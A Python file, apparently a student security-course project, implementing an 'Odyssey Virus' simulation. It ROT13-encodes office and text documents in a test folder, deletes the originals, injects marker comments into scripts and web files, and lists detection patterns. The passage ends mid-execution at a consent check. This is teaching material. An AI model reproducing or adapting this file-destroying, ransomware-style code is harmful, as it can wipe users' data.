#!/usr/bin/env python3
"""
Odyssey Virus
National Teachers College - Information Assurance and Security 1 Finals Project

DISCLAIMER: This code is for educational purposes only.
Must be executed in virtual machine or isolated sandbox environment.
DO NOT execute on production systems or distribute maliciously.

Author: Tavera's Group
Institution: National Teachers College
Date: June 2025
Encryption: ROT13 Algorithm Only

MODIFICATIONS:
- Original files are deleted after encryption (realistic simulation)
- No auto-creation of sample files (user must provide test files)
- More realistic malware behavior simulation
- Enhanced encryption process with file replacement

EDUCATIONAL OBJECTIVES:
- Demonstrate realistic malware behavior simulation across document types
- Showcase ROT13 cryptographic implementation with file replacement
- Provide hands-on cybersecurity learning experience
- Enable antivirus development and testing

SAFETY FEATURES:
- Virtual machine detection
- Educational consent verification
- Comprehensive activity logging
- Controlled environment operation
"""

import os
import sys
import time
import json
import shutil
import hashlib
import platform
from datetime import datetime
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

# Document processing libraries (install if needed)
try:
    from docx import Document
    from docx.shared import Inches
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False
    print("⚠️ python-docx not available. Word document support will be limited.")

try:
    import PyPDF2
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False
    print("⚠️ PyPDF2 not available. PDF support will be limited.")

try:
    import openpyxl
    XLSX_AVAILABLE = True
except ImportError:
    XLSX_AVAILABLE = False
    print("⚠️ openpyxl not available. Excel support will be limited.")

try:
    from pptx import Presentation
    PPTX_AVAILABLE = True
except ImportError:
    PPTX_AVAILABLE = False
    print("⚠️ python-pptx not available. PowerPoint support will be limited.")

class ROT13Cryptography:
    """
    ROT13 Cryptographic Implementation
    
    ROT13 is a simple letter substitution cipher that replaces each letter
    with the letter 13 positions after it in the alphabet. It's a special
    case of the Caesar cipher with a fixed shift of 13.
    
    Key Properties:
    - Self-inverse: applying ROT13 twice returns original text
    - Only affects alphabetic characters
    - Preserves case and non-alphabetic characters
    - Historically used in online forums for spoiler protection
    """
    
    @staticmethod
    def rot13_transform(text):
        """
        Apply ROT13 transformation to input text
        
        Args:
            text (str): Input text to transform
            
        Returns:
            str: ROT13 transformed text
        """
        result = []
        
        for char in text:
            if char.isalpha():
                is_upper = char.isupper()
                char = char.upper()
                transformed_char = chr(((ord(char) - ord('A') + 13) % 26) + ord('A'))
                
                if not is_upper:
                    transformed_char = transformed_char.lower()
                    
                result.append(transformed_char)
            else:
                result.append(char)
        
        return ''.join(result)
    
    @staticmethod
    def rot13_encrypt(plaintext):
        """Encrypt plaintext using ROT13"""
        return ROT13Cryptography.rot13_transform(plaintext)
    
    @staticmethod
    def rot13_decrypt(ciphertext):
        """Decrypt ROT13 ciphertext (self-inverse)"""
        return ROT13Cryptography.rot13_transform(ciphertext)

class DocumentProcessor:
    """
    Advanced document processing engine for various file types
    
    Supports:
    - Word Documents (.docx)
    - PDF files (.pdf) - text extraction
    - Excel files (.xlsx)
    - PowerPoint presentations (.pptx)
    - Plain text files (.txt, .md, .csv)
    """
    
    def __init__(self, crypto_engine):
        self.crypto_engine = crypto_engine
        
    def extract_text_from_docx(self, file_path):
        """Extract text content from Word document"""
        if not DOCX_AVAILABLE:
            return None, "python-docx library not available"
        
        try:
            doc = Document(file_path)
            text_content = []
            
            # Extract paragraphs
            for paragraph in doc.paragraphs:
                if paragraph.text.strip():
                    text_content.append(paragraph.text)
            
            # Extract table content
            for table in doc.tables:
                for row in table.rows:
                    row_text = []
                    for cell in row.cells:
                        if cell.text.strip():
                            row_text.append(cell.text)
                    if row_text:
                        text_content.append(" | ".join(row_text))
            
            return "\n".join(text_content), None
            
        except Exception as e:
            return None, f"Error reading DOCX: {str(e)}"
    
    def create_encrypted_docx(self, original_path, encrypted_text, output_path):
        """Create encrypted Word document"""
        if not DOCX_AVAILABLE:
            return False, "python-docx library not available"
        
        try:
            # Create new document
            doc = Document()
            
            # Add title
            title = doc.add_heading('Encrypted Document - ROT13', 0)
            
            # Add virus signature
            doc.add_paragraph(f'<!-- {OdysseyVirus().virus_signature} -->')
            doc.add_paragraph(f'<!-- Encryption: ROT13 -->')
            doc.add_paragraph(f'<!-- Original: {os.path.basename(original_path)} -->')
            doc.add_paragraph(f'<!-- Timestamp: {datetime.now().isoformat()} -->')
            
            # Add encrypted content
            doc.add_heading('Encrypted Content:', level=1)
            
            # Split encrypted text into paragraphs
            paragraphs = encrypted_text.split('\n')
            for para in paragraphs:
                if para.strip():
                    doc.add_paragraph(para)
            
            # Add educational note
            doc.add_heading('Educational Note:', level=1)
            doc.add_paragraph('This document has been encrypted using ROT13 for educational purposes.')
            doc.add_paragraph('ROT13 is a simple Caesar cipher with a shift of 13 positions.')
            doc.add_paragraph('This is part of a cybersecurity learning exercise.')
            
            # Save document
            doc.save(output_path)
            return True, None
            
        except Exception as e:
            return False, f"Error creating encrypted DOCX: {str(e)}"
    
    def extract_text_from_pdf(self, file_path):
        """Extract text from PDF file"""
        if not PDF_AVAILABLE:
            return None, "PyPDF2 library not available"
        
        try:
            with open(file_path, 'rb') as file:
                pdf_reader = PyPDF2.PdfReader(file)
                text_content = []
                
                for page in pdf_reader.pages:
                    text = page.extract_text()
                    if text.strip():
                        text_content.append(text)
                
                return "\n".join(text_content), None
                
        except Exception as e:
            return None, f"Error reading PDF: {str(e)}"
    
    def extract_text_from_xlsx(self, file_path):
        """Extract text from Excel file"""
        if not XLSX_AVAILABLE:
            return None, "openpyxl library not available"
        
        try:
            workbook = openpyxl.load_workbook(file_path)
            text_content = []
            
            for sheet_name in workbook.sheetnames:
                sheet = workbook[sheet_name]
                text_content.append(f"=== Sheet: {sheet_name} ===")
                
                for row in sheet.iter_rows():
                    row_values = []
                    for cell in row:
                        if cell.value is not None:
                            row_values.append(str(cell.value))
                    if row_values:
                        text_content.append(" | ".join(row_values))
            
            return "\n".join(text_content), None
            
        except Exception as e:
            return None, f"Error reading XLSX: {str(e)}"
    
    def extract_text_from_pptx(self, file_path):
        """Extract text from PowerPoint presentation"""
        if not PPTX_AVAILABLE:
            return None, "python-pptx library not available"
        
        try:
            prs = Presentation(file_path)
            text_content = []
            
            for i, slide in enumerate(prs.slides, 1):
                text_content.append(f"=== Slide {i} ===")
                
                for shape in slide.shapes:
                    if hasattr(shape, "text") and shape.text.strip():
                        text_content.append(shape.text)
            
            return "\n".join(text_content), None
            
        except Exception as e:
            return None, f"Error reading PPTX: {str(e)}"
    
    def process_document(self, file_path):
        """
        Process document based on file extension
        
        Returns:
            tuple: (text_content, error_message)
        """
        file_extension = os.path.splitext(file_path)[1].lower()
        
        if file_extension == '.docx':
            return self.extract_text_from_docx(file_path)
        elif file_extension == '.pdf':
            return self.extract_text_from_pdf(file_path)
        elif file_extension == '.xlsx':
            return self.extract_text_from_xlsx(file_path)
        elif file_extension == '.pptx':
            return self.extract_text_from_pptx(file_path)
        elif file_extension in ['.txt', '.md', '.csv', '.py', '.js', '.html', '.css']:
            # Plain text files
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read(), None
            except Exception as e:
                return None, f"Error reading text file: {str(e)}"
        else:
            return None, f"Unsupported file type: {file_extension}"

class SecurityValidator:
    """Educational Safety and Security Validation System"""
    
    @staticmethod
    def detect_virtual_environment():
        """Detect if code is running in virtual machine environment"""
        vm_indicators = [
            'vmware', 'virtualbox', 'vbox', 'qemu', 'xen',
            'hyper-v', 'parallels', 'kvm', 'bochs'
        ]
        
        system_info = platform.platform().lower()
        for indicator in vm_indicators:
            if indicator in system_info:
                return True
        
        vm_file_indicators = [
            '/proc/vz', '/proc/xen', '/sys/bus/vmbus',
            'C:\\Program Files\\VMware',
            'C:\\Program Files\\Oracle\\VirtualBox',
            '/usr/bin/VBoxService',
            '/usr/sbin/vboxguest-service'
        ]
        
        for path in vm_file_indicators:
            if os.path.exists(path):
                return True
        
        return False
    
    @staticmethod
    def request_educational_consent():
        """Display educational consent dialog"""
        try:
            root = tk.Tk()
            root.withdraw()
            
            consent_message = """
═══════════════════════════════════════════════════
    ODYSSEY VIRUS
═══════════════════════════════════════════════════

BEHAVIORAL CHANGES:
• Original files will be DELETED after encryption
• No automatic sample file creation
• More realistic malware simulation
• Files will be permanently replaced with encrypted versions

INSTITUTIONAL CONTEXT:
• National Teachers College Cybersecurity Exercise
• Academic Research and Learning Purposes Only
• Supervised Educational Environment Required

SAFETY CONFIRMATION REQUIRED:
✓ I confirm this is for academic purposes only
✓ I am running this in a virtual machine environment  
✓ I understand original files will be deleted
✓ I have backed up important files outside the target directory
✓ I will not distribute or misuse this program
✓ I accept responsibility for ethical usage

TECHNICAL IMPLEMENTATION:
• ROT13 cryptographic algorithm demonstration
• Multi-format document processing with file replacement
• Realistic malware behavior simulation
• Antivirus development and testing framework

Do you provide consent to proceed with this educational exercise?
            """
            
            result = messagebox.askyesno("Educational Consent - Odyssey Virus", consent_message)
            root.destroy()
            return result
            
        except Exception as e:
            print(consent_message)
            response = input("\nType 'CONSENT' to proceed with educational exercise: ").strip().upper()
            return response == 'CONSENT'

class OdysseyVirus:
    """Odyssey Virus with Multi-Document Support"""
    
    def __init__(self):
        """Initialize Odyssey virus with document processing"""
        
        # Virus identification and signature
        self.virus_signature = "ODYSSEY_VIRUS_2025_NTC"
        self.virus_version = "2.1_EDUCATIONAL"
        self.institution = "National Teachers College"
        
        # Cryptographic and document processing engines
        self.crypto_engine = ROT13Cryptography()
        self.document_processor = DocumentProcessor(self.crypto_engine)
        
        # File system configuration
        self.target_directory = "odyssey_test_environment"
        self.log_file = "odyssey_activity.log"
        self.marker_file = ".odyssey_infection_marker"
        self.payload_file = "odyssey_encrypted_payload.dat"
        self.encryption_log_file = "odyssey_encryption_manifest.json"
        
        # Supported file types
        self.supported_extensions = [
            '.txt', '.md', '.csv', '.py', '.js', '.html', '.css',  # Text files
            '.docx',  # Word documents
            '.pdf',   # PDF files  
            '.xlsx',  # Excel files
            '.pptx'   # PowerPoint files
        ]
        
        # Educational messages (encrypted with ROT13)
        self.encrypted_educational_messages = [
            "Zbqvsvrq Bqlffrk Rqhpngvbany Ivehhf - Svyr Ercynprzrag Fvzhyngvba",
            "EBG13 Rapekcgvba jvgu Bevtvany Svyr Qryrgvba",
            "Natgvbany Grnpuref Pbyyrtr - Ernyvfgvp Znyjner Orunjvbe Fghql"
        ]
        
        # Execution statistics
        self.execution_start_time = None
        self.files_processed = 0
        self.files_replaced = 0
        self.files_infected = 0
        self.encryption_operations = 0
        self.infection_operations = 0
        self.document_types_processed = {}
        
        # Infection payloads
        self.infection_signatures = [
            f"<!-- {self.virus_signature} INFECTION MARKER -->",
            f"# {self.virus_signature} - Educational Malware Injection",
            f"/* {self.virus_signature} - Virus Code Injection */",
            f"// {self.virus_signature} - Script Infection",
            f"# INFECTED BY {self.virus_signature} #"
        ]
        
    def initialize_logging_system(self):
        """Initialize comprehensive activity logging system"""
        self.execution_start_time = datetime.now()
        
        log_header = f"""
═══════════════════════════════════════════════════════════════════
ODYSSEY VIRUS - ACTIVITY LOG
═══════════════════════════════════════════════════════════════════
Virus Signature: {self.virus_signature}
Version: {self.virus_version}
Institution: {self.institution}
Execution Started: {self.execution_start_time.strftime('%Y-%m-%d %H:%M:%S')}
Encryption Algorithm: ROT13
Target Environment: {self.target_directory}
Supported Documents: {', '.join(self.supported_extensions)}
Behavior: Original files will be deleted after encryption
═══════════════════════════════════════════════════════════════════

"""
        
        with open(self.log_file, 'w', encoding='utf-8') as log:
            log.write(log_header)
            
        self.log_activity("Odyssey virus logging system initialized")
    
    def log_activity(self, activity_description, category="INFO"):
        """Log virus activity with timestamp and categorization"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{category}] {activity_description}\n"
        
        with open(self.log_file, 'a', encoding='utf-8') as log:
            log.write(log_entry)
        
        # Display to console with appropriate formatting
        if category == "ERROR":
            print(f"❌ {activity_description}")
        elif category == "WARNING":
            print(f"⚠️  {activity_description}")
        elif category == "CRYPTO":
            print(f"🔐 {activity_description}")
        elif category == "DOCUMENT":
            print(f"📄 {activity_description}")
        elif category == "DELETE":
            print(f"🗑️  {activity_description}")
        else:
            print(f"📝 {activity_description}")
    
    def setup_target_environment(self):
        """Setup target environment directory (without creating sample files)"""
        self.log_activity("Setting up target environment directory")
        
        if not os.path.exists(self.target_directory):
            os.makedirs(self.target_directory)
            self.log_activity(f"Created target directory: {self.target_directory}")
        else:
            self.log_activity(f"Target directory already exists: {self.target_directory}")
        
        # Check if directory has user files
        user_files = []
        for filename in os.listdir(self.target_directory):
            file_path = os.path.join(self.target_directory, filename)
            if os.path.isfile(file_path) and not filename.startswith('.'):
                file_extension = os.path.splitext(filename)[1].lower()
                if file_extension in self.supported_extensions:
                    user_files.append(filename)
        
        if user_files:
            self.log_activity(f"Found {len(user_files)} user files ready for processing")
            for filename in user_files:
                self.log_activity(f"  - {filename}")
        else:
            self.log_activity("No user files found in target directory", "WARNING")
            self.log_activity("Users should place test files in the target directory before running the virus", "WARNING")
        
        self.log_activity("Target environment setup completed")
    
    def infect_file(self, file_path):
        """Inject virus signatures into files without encrypting them"""
        try:
            filename = os.path.basename(file_path)
            file_extension = os.path.splitext(file_path)[1].lower()
            
            # Read original file content
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                original_content = f.read()
            
            # Skip if already infected
            if self.virus_signature in original_content:
                return False, "File already infected"
            
            # Create backup filename
            backup_path = file_path + ".backup"
            
            # Create backup of original
            with open(backup_path, 'w', encoding='utf-8') as f:
                f.write(original_content)
            
            # Prepare infection payload based on file type
            infected_content = self.prepare_infection_payload(original_content, file_extension)
            
            if infected_content is None:
                return False, "File type not suitable for infection"
            
            # Write infected content back to original file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(infected_content)
            
            self.files_infected += 1
            self.infection_operations += 1
            self.log_activity(f"INFECTED file: {filename}", "CRYPTO")
            
            return True, None
            
        except Exception as e:
            return False, f"Failed to infect file: {str(e)}"
    
    def prepare_infection_payload(self, original_content, file_extension):
        """Prepare infection payload based on file type"""
        infection_timestamp = datetime.now().isoformat()
        
        if file_extension in ['.txt', '.md']:
            # Text file infection
            infected_content = f"{self.infection_signatures[0]}\n"
            infected_content += f"<!-- Infection Time: {infection_timestamp} -->\n"
            infected_content += f"<!-- Educational Virus Injection -->\n\n"
            infected_content += original_content
            infected_content += f"\n\n{self.infection_signatures[4]}"
            infected_content += f"\nInfection performed for educational cybersecurity research"
            infected_content += f"\nNational Teachers College - Security Analysis Project"
            return infected_content
            
        elif file_extension in ['.py', '.js']:
            # Script file infection
            infected_content = f"{self.infection_signatures[1]}\n"
            infected_content += f"# Infection Time: {infection_timestamp}\n"
            infected_content += f"# Educational Purpose: Malware Behavior Simulation\n"
            infected_content += f"# Institution: National Teachers College\n\n"
            infected_content += original_content
            infected_content += f"\n\n{self.infection_signatures[3]}"
            infected_content += f"\n# Educational virus injection completed"
            return infected_content
            
        elif file_extension in ['.html', '.css']:
            # Web file infection
            infected_content = f"{self.infection_signatures[2]}\n"
            infected_content += f"/* Infection Time: {infection_timestamp} */\n"
            infected_content += f"/* Educational Malware Simulation */\n\n"
            infected_content += original_content
            infected_content += f"\n\n<!-- {self.virus_signature} INFECTION END -->"
            return infected_content
            
        elif file_extension == '.csv':
            # CSV file infection
            lines = original_content.split('\n')
            infected_lines = [f"# {self.infection_signatures[1]}"]
            infected_lines.extend(lines)
            infected_lines.append(f"# Infected: {infection_timestamp}")
            infected_lines.append(f"# Educational Purpose Only")
            return '\n'.join(infected_lines)
            
        else:
            # Generic text-based infection
            infected_content = f"{self.infection_signatures[0]}\n"
            infected_content += original_content
            infected_content += f"\n{self.infection_signatures[4]}"
            return infected_content
    
    def perform_file_infection(self):
        """Perform file infection on suitable files"""
        self.log_activity("Initiating file infection process", "CRYPTO")
        
        if not os.path.exists(self.target_directory):
            self.setup_target_environment()
        
        infection_manifest = {}
        infected_files = []
        
        for filename in os.listdir(self.target_directory):
            file_path = os.path.join(self.target_directory, filename)
            
            # Skip directories and special files
            if not os.path.isfile(file_path) or filename.startswith('.'):
                continue
                
            # Skip already processed files
            if "ODYSSEY_ENCRYPTED" in filename or "ODYSSEY_LOCKED" in filename:
                continue
                
            # Skip system files
            if filename in [self.log_file, self.marker_file, self.payload_file]:
                continue
            
            # Check if file extension is suitable for infection
            file_extension = os.path.splitext(filename)[1].lower()
            if file_extension not in ['.txt', '.md', '.csv', '.py', '.js', '.html', '.css']:
                continue
            
            # Attempt infection
            success, error = self.infect_file(file_path)
            
            if success:
                infection_manifest[filename] = {
                    "original_filename": filename,
                    "file_type": file_extension,
                    "infection_timestamp": datetime.now().isoformat(),
                    "virus_signature": self.virus_signature,
                    "infection_type": "content_injection",
                    "backup_created": True,
                    "backup_filename": filename + ".backup"
                }
                infected_files.append(filename)
                self.log_activity(f"Successfully infected: {filename}", "CRYPTO")
            elif error:
                self.log_activity(f"Failed to infect {filename}: {error}", "WARNING")
        
        # Save infection manifest
        if infected_files:
            infection_manifest_path = os.path.join(self.target_directory, "odyssey_infection_manifest.json")
            with open(infection_manifest_path, 'w', encoding='utf-8') as f:
                json.dump(infection_manifest, f, indent=2)
            
            self.log_activity(f"Infection manifest saved: {len(infected_files)} files infected", "CRYPTO")
        
        self.log_activity(f"File infection completed: {len(infected_files)} files infected")
        return len(infected_files)
    
    def perform_file_encryption(self):
        """File encryption supporting multiple document types with original file deletion"""
        self.log_activity("Initiating multi-format file encryption with file replacement", "CRYPTO")
        
        if not os.path.exists(self.target_directory):
            self.setup_target_environment()
        
        encryption_manifest = {}
        processed_files = []
        
        for filename in os.listdir(self.target_directory):
            file_path = os.path.join(self.target_directory, filename)
            
            # Skip directories and special files
            if not os.path.isfile(file_path) or filename.startswith('.'):
                continue
                
            # Skip already encrypted files and system files
            if "ODYSSEY_ENCRYPTED" in filename or filename in [self.log_file, self.marker_file, self.payload_file]:
                continue
            
            # Check if file extension is supported
            file_extension = os.path.splitext(filename)[1].lower()
            if file_extension not in self.supported_extensions:
                self.log_activity(f"Skipping unsupported file type: {filename}", "WARNING")
                continue
            
            try:
                self.log_activity(f"Processing {file_extension} file: {filename}", "DOCUMENT")
                
                # Extract text content using document processor
                text_content, error = self.document_processor.process_document(file_path)
                
                if error:
                    self.log_activity(f"Failed to process {filename}: {error}", "ERROR")
                    continue
                
                if text_content is None:
                    self.log_activity(f"No text content extracted from {filename}", "WARNING")
                    continue
                
                # Store original file info before deletion
                original_file_size = os.path.getsize(file_path)
                original_file_hash = self.calculate_file_hash(file_path)
                
                # Apply ROT13 encryption to extracted text
                encrypted_content = self.crypto_engine.rot13_encrypt(text_content)
                
                # Generate encrypted filename
                name, extension = os.path.splitext(filename)
                
                # Handle special case for Word documents
                if extension.lower() == '.docx' and DOCX_AVAILABLE:
                    encrypted_filename = f"{name}_ODYSSEY_ENCRYPTED{extension}"
                    encrypted_file_path = os.path.join(self.target_directory, encrypted_filename)
                    
                    # Create encrypted Word document
                    success, error = self.document_processor.create_encrypted_docx(
                        file_path, encrypted_content, encrypted_file_path
                    )
                    
                    if not success:
                        self.log_activity(f"Failed to create encrypted DOCX: {error}", "ERROR")
                        continue
                        
                else:
                    # For other file types, create encrypted text file
                    encrypted_filename = f"{name}_ODYSSEY_ENCRYPTED.txt"
                    encrypted_file_path = os.path.join(self.target_directory, encrypted_filename)
                    
                    with open(encrypted_file_path, 'w', encoding='utf-8') as f:
                        f.write(f"=== ENCRYPTED {extension.upper()} CONTENT ===\n")
                        f.write(f"Original File: {filename}\n")
                        f.write(f"Encryption: ROT13\n")
                        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                        f.write("=" * 50 + "\n\n")
                        f.write(encrypted_content)
                        f.write(f"\n\n<!-- {self.virus_signature} -->")
                        f.write(f"\n<!-- Encryption: ROT13 -->")
                        f.write(f"\n<!-- Original: {filename} -->")
                        f.write(f"\n<!-- Document Type: {extension} -->")
                        f.write(f"\n<!-- Timestamp: {datetime.now().isoformat()} -->")
                
                # **CRITICAL CHANGE: Delete the original file after successful encryption**
                try:
                    os.remove(file_path)
                    self.log_activity(f"DELETED original file: {filename}", "DELETE")
                    self.files_replaced += 1
                except Exception as delete_error:
                    self.log_activity(f"Failed to delete original file {filename}: {str(delete_error)}", "ERROR")
                    # Remove the encrypted file if we couldn't delete the original
                    try:
                        os.remove(encrypted_file_path)
                        self.log_activity(f"Removed encrypted file due to deletion failure: {encrypted_filename}", "ERROR")
                    except:
                        pass
                    continue
                
                # Update encryption manifest
                encryption_manifest[encrypted_filename] = {
                    "original_filename": filename,
                    "original_type": file_extension,
                    "encryption_algorithm": "ROT13",
                    "encryption_timestamp": datetime.now().isoformat(),
                    "file_size_original": original_file_size,
                    "file_size_encrypted": os.path.getsize(encrypted_file_path),
                    "original_file_hash": original_file_hash,
                    "virus_signature": self.virus_signature,
                    "text_length": len(text_content),
                    "encrypted_length": len(encrypted_content),
                    "original_file_deleted": True
                }
                
                # Update statistics
                processed_files.append(filename)
                self.files_processed += 1
                self.encryption_operations += 1
                
                # Track document types
                if file_extension in self.document_types_processed:
                    self.document_types_processed[file_extension] += 1
                else:
                    self.document_types_processed[file_extension] = 1
                
                self.log_activity(f"REPLACED {filename} with {encrypted_filename}", "CRYPTO")
                
            except Exception as e:
                self.log_activity(f"Failed to encrypt {filename}: {str(e)}", "ERROR")
        
        # Save encryption manifest
        manifest_path = os.path.join(self.target_directory, self.encryption_log_file)
        with open(manifest_path, 'w', encoding='utf-8') as f:
            json.dump(encryption_manifest, f, indent=2)
        
        self.log_activity(f"Encryption manifest saved: {len(encryption_manifest)} entries", "CRYPTO")
        self.log_activity(f"File replacement completed: {len(processed_files)} files processed")
        self.log_activity(f"Original files deleted: {self.files_replaced}")
        
        # Log document type statistics
        self.log_activity("Document type processing statistics:", "INFO")
        for doc_type, count in self.document_types_processed.items():
            self.log_activity(f"  {doc_type}: {count} files", "INFO")
    
    def calculate_file_hash(self, filepath):
        """Calculate SHA-256 hash of file"""
        try:
            hash_sha256 = hashlib.sha256()
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_sha256.update(chunk)
            return hash_sha256.hexdigest()
        except Exception:
            return None
    
    def display_educational_messages(self):
        """Display educational popup messages with ROT13 decryption demonstration"""
        self.log_activity("Displaying educational popup messages")
        
        try:
            root = tk.Tk()
            root.withdraw()
            
            for i, encrypted_message in enumerate(self.encrypted_educational_messages, 1):
                decrypted_message = self.crypto_engine.rot13_decrypt(encrypted_message)
                
                dialog_content = f"""
Odyssey Virus - Message {i}

ENCRYPTED (ROT13): {encrypted_message}

DECRYPTED: {decrypted_message}

BEHAVIORAL CHANGES:
• Original files are now DELETED after encryption
• Files are permanently replaced with encrypted versions
• No automatic sample file creation
• More realistic malware simulation

MULTI-DOCUMENT SUPPORT:
• Word Documents (.docx)
• PDF Files (.pdf)
• Excel Spreadsheets (.xlsx)
• PowerPoint Presentations (.pptx)
• Plain Text Files (.txt, .md, .csv)

Educational Purpose: Advanced Cybersecurity Learning & Antivirus Development
Files Replaced: {self.files_replaced}
"""
                
                messagebox.showinfo(f"Odyssey Message {i}", dialog_content)
                self.log_activity(f"Displayed educational message {i}: {decrypted_message}")
                time.sleep(1)
            
            root.destroy()
            
        except Exception as e:
            self.log_activity("GUI unavailable, using console display", "WARNING")
            
            for i, encrypted_message in enumerate(self.encrypted_educational_messages, 1):
                decrypted_message = self.crypto_engine.rot13_decrypt(encrypted_message)
                
                print(f"\n═══ ODYSSEY MESSAGE {i} ═══")
                print(f"ENCRYPTED: {encrypted_message}")
                print(f"DECRYPTED: {decrypted_message}")
                print("BEHAVIOR: Original files deleted and replaced")
                print(f"Files Replaced: {self.files_replaced}")
                print("═" * 50)
                
                self.log_activity(f"Console message {i}: {decrypted_message}")
                time.sleep(2)
    
    def generate_payload(self):
        """Generate encrypted payload with document processing info"""
        self.log_activity("Generating encrypted virus payload", "CRYPTO")
        
        payload_data = {
            "virus_identification": {
                "name": "Odyssey Virus",
                "signature": self.virus_signature,
                "version": self.virus_version,
                "institution": self.institution
            },
            "behavioral_changes": {
                "original_file_deletion": True,
                "file_replacement": True,
                "file_infection": True,
                "no_sample_creation": True,
                "realistic_simulation": True
            },
            "cryptographic_implementation": {
                "primary_algorithm": "ROT13",
                "algorithm_type": "Substitution Cipher",
                "key_rotation": 13,
                "self_inverse": True
            },
            "document_processing_capabilities": {
                "supported_formats": self.supported_extensions,
                "word_documents": DOCX_AVAILABLE,
                "pdf_support": PDF_AVAILABLE,
                "excel_support": XLSX_AVAILABLE,
                "powerpoint_support": PPTX_AVAILABLE,
                "text_extraction": True
            },
            "execution_metadata": {
                "creation_timestamp": datetime.now().isoformat(),
                "target_environment": self.target_directory,
                "files_processed": self.files_processed,
                "files_infected": self.files_infected,
                "files_replaced": self.files_replaced,
                "encryption_operations": self.encryption_operations,
                "infection_operations": self.infection_operations,
                "document_types_processed": self.document_types_processed
            },
            "educational_context": {
                "project_type": "Advanced Academic Cybersecurity Exercise",
                "learning_objectives": [
                    "File infection with virus signature injection",
                    "Realistic multi-format malware behavior analysis",
                    "ROT13 cryptographic implementation with file replacement", 
                    "Document-aware antivirus development",
                    "Advanced cybersecurity threat simulation"
                ],
                "safety_measures": [
                    "Virtual machine requirement",
                    "Educational consent verification",
                    "File replacement simulation",
                    "Comprehensive logging"
                ]
            },
            "antivirus_hints": {
                "detection_patterns": [
                    "*ODYSSEY_ENCRYPTED*",
                    self.virus_signature,
                    "ROT13 encrypted content",
                    ".odyssey_infection_marker",
                    "INFECTION MARKER",
                    "Educational Malware Injection"
                ],
                "decryption_algorithm": "ROT13",
                "removal_strategy": "Decrypt encrypted files, clean infected files, restore content (original files deleted)",
                "document_processing": "Handle multiple document formats, note that originals are gone",
                "infection_cleaning": "Remove virus signatures from infected files, restore from backups if available",
                "recovery_limitation": "Original files deleted - can only recover decrypted content and clean infections"
            }
        }
        
        payload_json = json.dumps(payload_data, indent=2)
        encrypted_payload = self.crypto_engine.rot13_encrypt(payload_json)
        
        payload_path = os.path.join(self.target_directory, self.payload_file)
        with open(payload_path, 'w', encoding='utf-8') as f:
            f.write(encrypted_payload)
            f.write(f"\n\n<!-- {self.virus_signature} -->")
            f.write(f"\n<!-- Payload encrypted with ROT13 -->")
            f.write(f"\n<!-- File Replacement -->")
        
        self.log_activity(f"Encrypted payload generated: {self.payload_file}", "CRYPTO")
    
    def simulate_file_manipulation(self):
        """Simulate temporary file manipulation behaviors (only on encrypted files)"""
        self.log_activity("Simulating file manipulation behaviors on encrypted files")
        
        manipulation_targets = []
        
        for filename in os.listdir(self.target_directory):
            if "ODYSSEY_ENCRYPTED" in filename and not filename.startswith('ODYSSEY_LOCKED_'):
                file_path = os.path.join(self.target_directory, filename)
                locked_filename = f"ODYSSEY_LOCKED_{filename}"
                locked_path = os.path.join(self.target_directory, locked_filename)
                
                try:
                    os.rename(file_path, locked_path)
                    manipulation_targets.append((locked_path, file_path))
                    self.log_activity(f"Temporarily locked encrypted file: {filename}")
                except Exception as e:
                    self.log_activity(f"Failed to lock {filename}: {str(e)}", "ERROR")
        
        self.log_activity("Simulating encrypted document processing (3 seconds)...")
        time.sleep(3)
        
        for locked_path, original_path in manipulation_targets:
            try:
                os.rename(locked_path, original_path)
                original_filename = os.path.basename(original_path)
                self.log_activity(f"Restored encrypted file: {original_filename}")
            except Exception as e:
                self.log_activity(f"Failed to restore {original_path}: {str(e)}", "ERROR")
        
        self.log_activity("File manipulation simulation completed")
    
    def create_infection_marker(self):
        """Create virus infection marker"""
        self.log_activity("Creating infection marker")
        
        execution_duration = datetime.now() - self.execution_start_time
        
        marker_data = {
            "infection_metadata": {
                "virus_signature": self.virus_signature,
                "virus_version": self.virus_version,
                "infection_timestamp": self.execution_start_time.isoformat(),
                "execution_duration_seconds": execution_duration.total_seconds(),
                "behavioral_modification": "File replacement simulation"
            },
            "system_information": {
                "platform": platform.platform(),
                "python_version": platform.python_version(),
                "target_directory": self.target_directory
            },
            "execution_statistics": {
                "files_processed": self.files_processed,
                "files_infected": self.files_infected,
                "files_replaced": self.files_replaced,
                "encryption_operations": self.encryption_operations,
                "infection_operations": self.infection_operations,
                "messages_displayed": len(self.encrypted_educational_messages),
                "document_types_processed": self.document_types_processed
            },
            "document_support_status": {
                "docx_support": DOCX_AVAILABLE,
                "pdf_support": PDF_AVAILABLE,
                "xlsx_support": XLSX_AVAILABLE,
                "pptx_support": PPTX_AVAILABLE,
                "supported_extensions": self.supported_extensions
            },
            "behavioral_characteristics": {
                "original_file_deletion": True,
                "file_replacement": True,
                "file_infection": True,
                "sample_file_creation": False,
                "realistic_malware_simulation": True
            },
            "educational_context": {
                "institution": self.institution,
                "project_type": "ROT13 Multi-Document Demonstration with File Replacement",
                "safety_verified": True
            },
            "antivirus_guidance": {
                "detection_signature": self.virus_signature,
                "encryption_algorithm": "ROT13",
                "encrypted_files_pattern": "*ODYSSEY_ENCRYPTED*",
                "payload_location": self.payload_file,
                "manifest_location": self.encryption_log_file,
                "document_processing_required": True,
                "recovery_limitation": "Original files deleted - can only create recovered versions"
            }
        }
        
        marker_path = os.path.join(self.target_directory, self.marker_file)
        with open(marker_path, 'w', encoding='utf-8') as f:
            json.dump(marker_data, f, indent=2)

        self.log_activity("Infection marker created successfully")

    def execute_educational_simulation(self):
        """Main execution routine for educational virus simulation"""
        print("👿 ODYSSEY VIRUS - EXECUTION STARTING")
        print("🗑️  WARNING: Original files will be DELETED and replaced with encrypted versions")
        print("📄 Multi-Document Support: Word, PDF, Excel, PowerPoint")
        print("═" * 60)
        
        try:
            self.initialize_logging_system()
            
            print("🔒 Performing safety verification...")
            
            if not SecurityValidator.request_educational_consent():
